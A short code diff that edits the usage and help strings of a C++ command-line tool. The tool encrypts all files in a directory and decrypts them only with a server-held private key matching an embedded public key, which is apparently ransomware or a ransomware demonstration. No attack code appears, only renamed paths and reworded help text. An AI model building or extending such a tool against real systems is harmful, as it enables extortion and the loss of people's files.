@@ -10,16 +10,16 @@ ArgumentParser::ArgumentParser()
     // Logger is disabled as default setting
     Logger::disable();
 
-    _usage      = "Usage: \n\t" + std::string(PROJECT_NAME) + " --dir /home/christian/test/\n\t"
-                                + std::string(PROJECT_NAME) + " --dir /home/christian/test/ --protected\n\t"
-                                + std::string(PROJECT_NAME) + " --encrypt /home/christian/test/ \n\t"
-                                + std::string(PROJECT_NAME) + " --decrypt /home/christian/test/ --key /home/user/SPrivateRSA.pem\n\n";
+    _usage      = "Usage: \n\t" + std::string(PROJECT_NAME) + " --dir /home/butterfly/test/\n\t"
+                                + std::string(PROJECT_NAME) + " --dir /home/butterfly/test/ --protected\n\t"
+                                + std::string(PROJECT_NAME) + " --encrypt /home/butterfly/test/ \n\t"
+                                + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/test/ --key /home/butterfly/SPrivateRSA.pem\n\n";
 
     _options    = "Options:\n";
     _dir        = "-d, --dir\t\tDirectory Path to start the Encryption+Decryption\n";
     _encrypt    = "--encrypt\t\tEncrypts all files in provided directory\n";
     _decrypt    = "--decrypt\t\tDecrypts all files in provided diretory\n";
-    _serverpKey = "-k, --key\t\tPrivate Server Key for the Decryption (corresponds to the embedded server public key)\n";
+    _serverpKey = "-k, --key\t\tPrivate Key from the Server for the Decryption (Corresponds to the embedded Server Public Key)\n";
     _protected  = "-p, --protected\t\tSave all key files to System\n";
     _config     = "-c, --config\t\tConfig Path\n";
     _help       = "-h, --help\t\tPrint help Message\n";
